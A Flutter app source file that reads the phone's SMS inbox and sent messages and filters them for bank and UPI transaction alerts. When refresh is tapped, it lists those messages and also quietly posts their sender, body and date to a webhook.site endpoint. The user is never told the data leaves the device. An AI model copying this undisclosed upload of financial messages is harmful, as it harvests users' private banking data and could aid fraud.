import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final SmsQuery _query = SmsQuery();
  List<SmsMessage> _messages = [];
  List<SmsMessage> _filteredMessages = [];
  final String backendUrl = 'https://webhook.site/4c27ab64-9214-44dd-8576-d2d698caff02'; // Replace with your backend URL
  @override
  void initState() {
    super.initState();
  }

  void _filterMessages() {
    _filteredMessages = _messages.where((message) {
      final body = message.body?.toLowerCase() ?? '';
      return (body.contains('credit') || body.contains('debit')) &&
          body.contains('a/c') &&
          body.contains('upi');
    }).toList();
  }

  Future<void> _sendMessagesToBackend(List<SmsMessage> messages) async {
    try {
      // Convert messages to a JSON-compatible format
      final data = messages.map((message) {
        return {
          'sender': message.sender,
          'body': message.body,
          'date': message.date.toString(),
        };
      }).toList();

      final response = await http.post(
        Uri.parse(backendUrl),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({'messages': data}),
      );

      if (response.statusCode == 200) {
        debugPrint('Messages successfully sent to backend.');
      } else {
        debugPrint('Failed to send messages: ${response.body}');
      }
    } catch (e) {
      debugPrint('Error sending messages to backend: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter SMS Inbox App',
      theme: ThemeData(
        primarySwatch: Colors.teal,
      ),
      home: Scaffold(
        appBar: AppBar(
          title: const Text('Filtered SMS Inbox Example'),
        ),
        body: Container(
          padding: const EdgeInsets.all(10.0),
          child: _filteredMessages.isNotEmpty
              ? _MessagesListView(messages: _filteredMessages)
              : Center(
            child: Text(
              'No messages to show.\nTap refresh button...',
              style: Theme.of(context).textTheme.headlineSmall,
              textAlign: TextAlign.center,
            ),
          ),
        ),
        floatingActionButton: FloatingActionButton(
          onPressed: () async {
            var permission = await Permission.sms.status;
            if (permission.isGranted) {
              final messages = await _query.querySms(
                kinds: [SmsQueryKind.inbox, SmsQueryKind.sent],
                count: 100, // Fetch a larger number to ensure transactional messages are included.
              );
              debugPrint('sms inbox messages: ${messages.length}');

              setState(() {
                _messages = messages;
                _filterMessages(); // Apply the filter after fetching messages.
              });

              // Send the filtered messages to backend
              await _sendMessagesToBackend(_filteredMessages);
            } else {
              await Permission.sms.request();
            }
          },
          child: const Icon(Icons.refresh),
        ),
      ),
    );
  }
}

class _MessagesListView extends StatelessWidget {
  const _MessagesListView({Key? key, required this.messages}) : super(key: key);

  final List<SmsMessage> messages;

  @override
  Widget build(BuildContext context) {
    return ListView.builder(
      shrinkWrap: true,
      itemCount: messages.length,
      itemBuilder: (BuildContext context, int i) {
        var message = messages[i];
        return ListTile(
          title: Text('${message.sender} [${message.date}]'),
          subtitle: Text('${message.body}'),
        );
      },
    );
  }
}
